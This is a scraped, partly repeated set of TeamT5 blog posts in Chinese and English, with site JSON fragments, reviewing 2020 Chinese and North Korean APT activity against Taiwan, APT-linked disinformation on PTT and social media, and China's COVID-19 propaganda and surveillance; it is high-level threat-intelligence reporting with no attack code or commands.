APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤

年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5 相信認識敵人是有效對抗針對性攻擊的第一步，而本文章主要針對 2020 年間所觀察到的 APT 網路攻擊態勢，提供一個概觀說明。TeamT5 威脅情資研究顯示 APT 攻擊手法持續進化，真正高端複雜的行動已經不可能由單一個資安產品做有效的防護。TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/)

Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense.

It has been confirmed that even the Chinese government-supported Advanced Persistent Threat (APT) hacking organization has been mobilized to manipulate public opinion such as disseminating fake news. APT organizations have gone beyond intelligence warfare. This is the first time that it has been confirmed that they have participated in public opinion.\n\nAccording to a report released by Taiwanese threat intelligence company TeamT5 at the recent SANS Summit, false accounts opened on social network service (SNS) platforms such as Facebook, Google (YouTube), and Twitter have been investigated at an all-time high.\n\nTeamT5 made this statement based on the number of closed accounts published on each SNS platform. Google said it had removed 186 YouTube channels that are estimated to be involved in the Chinese information war in the second quarter of last year.\n\nThe Chinese government is known to hold a pro-Chinese content and dissemination of false facts, which are known to be engaged in a defensive public opinion battle that includes state-run media and spam botnets while creating false accounts to create favorable public opinion. The number of Facebook pages used by The New York Times, CNN, and BBC pages exceeded the number of followers two years ago. As of April 2019, the number of followers on CGTN's Facebook page, the Chinese state media, was 75 million, while The New York Times, CNN, and BBC had 50 million each. \n\nIt wasn't even crazy. Targeting Taiwan, which the Chinese government observes, the APT hacking organization used \"Juiker\" to spread false information, which is a popular SNS platform used in Taiwan like KakaoTalk.\n\nTeamT5 said, \"The APT Group is an organization that focuses on espionage and information stealing, and the fact that they are mobilized in information warfare means that the Chinese government is putting all efforts into information warfare,\" and \"It is urgent,\" TeamT5 CTI analyst Che Chang warned.\n\nThe Chinese government turned out to build a system tool that monitors public opinion using Big Data and Artificial Intelligence (AI) technology, a system that can monitor not only domestic social media but also sensitive websites distributed abroad.\n\nTeamT5 is a security company founded by APT experts. It tracks and monitors versions between the Chinese government and supplies threat intelligence to Asia-Pacific regions such as Taiwan and Japan.\n\n[Read more](https://www.etnews.com/20210215000176)\n\n\u003cbr\u003e\n","__v":0,"id":"602e1c9fc56e80003f985a11"}],"createdAt":"2021-02-18T07:30:07.989Z","updatedAt":"2021-06-02T05:41:47.631Z","__v":0,"publish_date":"2021-02-15T04:00:00.000Z","author":"5eec3483163518003f86d943","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1613634738/SANS_1_a4937cc174.png","topic":"5ecaa036a792d70040a0d8b4","id":"602e177fc56e80003f985a0e"}],"id":"5f86a8b7da3440005757a946"}],"relative_posts":["5ecab44c602fc90040476047","5f0e5aad163518003f86d97e","602e177fc56e80003f985a0e"],"_id":"5f866d3ada3440005757a928","post_name":"InfoOp White Paper III: China’s Social Manipulation outside the Great Firewall","post_url":"info-op-white-paper-iii-china-s-social-manipulation-outside-the-great-firewall","publish_date":"2020-10-15T02:30:00.000Z","contents":[{"locale":"en","_id":"5f866d3ada3440005757a929","title":"InfoOp White Paper III: China’s Social Manipulation outside the Great Firewall","context":"In the final part of our Information Operation White Paper, we will demonstrate China's Information Operations (InfoOps) targeting the global audience.

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":{"category":"blogs","_id":"5ecaa02ba792d70040a0d8b3","name":"Information Operation","color":"#ae7bc5","createdAt":"2020-05-24T16:26:19.884Z","updatedAt":"2020-10-21T10:58:44.844Z","__v":0,"contents":[{"locale":"en","_id":"5edd65a5bf58af004a15411f","text":"Information Operation","createdAt":"2020-06-07T22:09:41.318Z","updatedAt":"2020-10-21T10:58:44.772Z","__v":0,"id":"5edd65a5bf58af004a15411f"},{"locale":"tw","_id":"5edd65a5bf58af004a154120","text":"資訊作戰","createdAt":"2020-06-07T22:09:41.319Z","updatedAt":"2020-10-21T10:58:44.777Z","__v":0,"id":"5edd65a5bf58af004a154120"},{"locale":"jp","_id":"5edd65a5bf58af004a154121","text":"インフォメーション\u003cbr\u003eオペレーション","createdAt":"2020-06-07T22:09:41.319Z","updatedAt":"2020-10-21T10:58:44.774Z","__v":0,"id":"5edd65a5bf58af004a154121"}],"posts":[{"publish":true,"enable_form":true,"tags":["5ece28882e1ee4004aa406f2","5ecf6cd6fedd7f004b269748","5ecf6ce4fedd7f004b269749","5ecf6cf8fedd7f004b26974b","5ecf6d00fedd7f004b26974c","5ecf6ceefedd7f004b26974a"],"relative_posts":["5f0e5aad163518003f86d97e","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5ecab44c602fc90040476047","post_url":"teamt5-information-operation-white-paper-observations-on-2020-taiwanese-general-elections","post_name":"TeamT5 Information Operation White Paper: Observations on 2020  Taiwanese General Elections","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342706/info_ops_part1_blog_cover_ad439b498b.jpg","contents":[{"locale":"en","_id":"5ecab44c602fc90040476048","title":"TeamT5 Information Operation White Paper: Observations on 2020 Taiwanese General Elections","context":"The ubiquity of social media has altered the way people consume information, which in turn dramatically changed the way electoral campaigns are run. From the 2018 municipal elections to the 2020 general elections, Taiwan has witnessed the growing threat of disinformation to the citizens. It was observed that many malicious actors utilized social media to disseminate a huge amount of fake news, false information, and hate speech. These disinformation are like highly contagious viruses that will not only affect the people consuming them, but also make them secondary disseminators. We assess that:\n\n1. Virus-like disinformation makes everyone on social media both victim and disseminator\n\n   Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media. We have observed that many of the voters who participated in the discussion turned out to be the source of dissemination.\n2. Disinformation continues to evolve in tactics and quantity, as well as expanding its targets\n\n   The Taiwanese Central Election Commission (CEC) stated that the number of disinformation cases before the 2020 elections reached an unprecedented level. In addition to the evolution in quantity and tactics, we observed that the dissemination of disinformation did not stop even after the election, but instead shifted the target.\n3. China continues to increase its influence\n\n   Apart from news agency promoting the Chinese policies, inauthentic accounts run by bot, and patriotic netizens (A.K.A little pink), China has stepped up its influence on social media platforms to shape narratives.\n4. Information operations are outsourced, layer-by-layer\n\n   Before the elections, a number of marketing firms and new media were established to spread political messages. We discovered that some of them have connections with certain political parties, implying the layer-by-layer outsourcing of Information Operations by politically motivated actors.\n\nFrom the perspective of security researchers, we integrated the Information Operations intercepted and investigated by TeamT5 over the past two years, hoping to contribute to the next democratic election.\n\nIf you are interested in this white paper, please fill out the form, and we will send you the report by email.\n\nCOMING UP NEXT: We will publish reports about how China conduct Information Operation on social media platforms, targeting domestic citizens and foreign audiences.

To assess the full version of the analysis, please subscribe our report \"Cyber Affairs Biweekly-Update.\"*\n\n### Key Takeaways\n\n1. China has exerted ever greater influence over the globe since the outbreak of the coronavirus. Over the past three months, TeamT5 has been monitoring how China utilizes its cyber strength and propaganda machine to handle the Covid-19 pandemic.\n2. The Chinese authorities have collaborated with telecom firms and tech giants in China, using technologies such as big data to control the public opinion and people's movement. The regime has implemented measures such as digital surveillance, keywords censorship on social media applications, and Health Code System.\n3. Moreover, China has also exercised its propaganda machine to shape both domestic and international narrative of the pandemic. The Chinese officials and Chinese state media have utilized various social media platforms, particularly Weibo and Twitter, to disseminate propaganda to Chinese people and foreign audiences. Some Chinese officials have connived and even promoted online conspiracy theory, which claimed China is not the origin of the coronavirus.\n\n### Blurred Lines Between State and Corps: Telecom Surveillance and Health Code System\n\nThe Chinese Communist Party (CCP) has collaborated with its national tech giants and telecom firms to implement a series of security measures in the name of containing the coronavirus outbreak.\n\nThe regime has elevated its digital control over domestic citizens. In mid-February, China's Ministry of Industry and Information Technology (MIIT) sent a notice to Information and Communications Technology (ICT) service providers, demanding relevant firms to strengthen monitoring and censorship over online public discussion.\\[1\\] The MIIT also announced the utilization of telecom big data analysis in support of the battle against the coronavirus. \\[2\\]\n\nAs the country tried to resume normal operations, the Chinese authorities launched Health Code System, using big data to monitor citizens' health status and then regulate their movement. The Health Code System is developed by the Ant Financial, an affiliate company of the Chinese Alibaba Group, and Tencent in collaboration with the Chinese authorities.\n\nThe system has raised privacy concerns since it connects and integrates databases of government units and private firms, forming a comprehensive surveillance system which contains real name, phone number, ID, address, travel history, health status and contact history. Moreover, only 3 out of 16 Health Code Apps list their user agreement and privacy policy at installation, while others will directly direct users to the registration page to fill out personal information.\\[3\\] This shows that most of the users' data are collected, processed, and shared without informed consent.\n\n### Strategic Distraction and Positive Propaganda Targeting Domestic Citizens\n\nThe authoritarian regime is also in another battle to shape the public opinion about the epidemic. Initially, the Chinese state media employed strategic distraction to mitigate the seriousness of the coronavirus. Before Wuhan Lockdown on January 23, Chinese state media started reporting the Influenza B in the United States.\\[4\\] The topic \"Influenza B outbreak in the US\" (美国爆发乙型流感) reached 500 million views and 31,000 discussions on Weibo.\\[5\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_1_4fb4158a6a.png)_Figure 1: News report by the China Central Television (CCTV)._\n\nAs the number confirmed cases soared in China, the Chinese state media outlets started to spread positive propaganda. For instance, they highly praised the Chinese authorities' handling of the virus by highlighting the rapid construction of Huoshenshan Hospital.\\[6\\] They also promoted narratives such as \"the Chinese people are sacrificing to fight the virus\", accompanied by praises from WHO Director General Tedros Adhanom Ghebreyesus.\\[7\\]\\[8\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718736/SR_2_0b7b7f6542.png)_Figure 2: YouTube video by China Global Television Network (CGTN)._\n\nThe regime has seized the opportunity to demonstrate the country's strength to contain the virus as well as the advantages of an authoritarian regime. The CCP uses the case to show that its authoritarian governance system is more effective than the liberal democracies when facing a crisis like the Covid-19 pandemic.\n\n### Propaganda, Hoaxes and Conspiracy Theories: From Troublemaker to Global Savior\n\nAlthough China was widely criticized for its delayed and opaque treatment to the coronavirus outbreak during the initial stage, the regime has backed on its feet to polish its international image after the pandemic seems to have subsided in China.\n\nIn particular, Italy, the first G-7 country to join China's Belt and Road Initiative (BRI), became a favorable environment for the regime to launch propaganda. We observed a series of propaganda was launched against Italy.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_3_c2c0ee47d2.png)_Figure 3: The Chinese embassy posted a series of tweets to promote China's medical aids foe Italy, using hashtag #ForzaCinaeItalia_\n\nThe campaign is revealed to have boosted by social manipulation, as the hashtag #ForzaCinaeItalia (Go China, go Italy) was promoted by Twitter bot accounts.\\[9\\]\n\nIn another case, since March 15, Chinese state media outlets as well as Chinese diplomats Hua Chunying and Zhao Lijian have promoted a video of Italian chanting \"Grazie, Cina!\" on their balconies with the Chinese anthem \"March of the Volunteers\" playing.\\[10\\] The video was examined by researchers and was claimed to be manufactured.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718737/SR_4_b4d7e95934.png)_Figure 4: Hua Chunying's sharing the video on Twitter._\n\n### \"Origin\" Propaganda: Conspiracy Theories of Patient Zero\n\nConspiracy theories of the origin of the coronavirus have emerged across social media platforms as early as January. One of the significant cases is a conspiracy theory claiming that the US military had brought the coronavirus to Wuhan during the 2019 Military World Games.\n\nStarting from March 12, 2020, Zhao Lijian, a deputy director of the Chinese Foreign Ministry's Information Department, has posted a series of tweet to amplify the conspiracy theory on Twitter. In one of his tweets, he shared a video clip of US Centers for Disease Control (CDC) chief Robert Redfield saying some Covid-19 death might have been diagnosed as influenza in the US, using it as evidence that the virus originated in the US.\\[11\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_5_2802d4b539.png)_Figure 5: A series of tweets by Zhao Lijian promoting the conspiracy theory, along with articles of \"globalresearch.ca\". The website often promotes anti-US conspiracy theory._\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_6_2bb97447e7.png)_Figure 6: Global Times reporting the conspiracy theory about US military personnel bringing COVID-19 to China._\n\nBesides the US, Italy is also one of the scapegoats for China's coronavirus origin propaganda. Starting from March 22, multiple Chinese state media outlets have published news article titled \"Coronavirus may have existed in Italy since November: local researcher,\" implying that Italy was the origin of Coronavirus.\\[12\\]\\[13\\] They cited the words of the Italian physician Giuseppe Remuzzi in an interview with NPR on March 19 \\[14\\], using it as statement to prove that China is not the origin of the coronavirus.\n\nAlthough Remuzzi protested that his words were twisted by China, the narrative has already gone viral.\\[15\\] The CCTV created a topic \"Expert claims the coronavirus may have existed in Italy since November\" (专家称疫情去年11月或已在意大利流行), which reached approximately 500 million views and 35,000 discussion posts.\n\n### Conclusion\n\nChina's cyber strength and 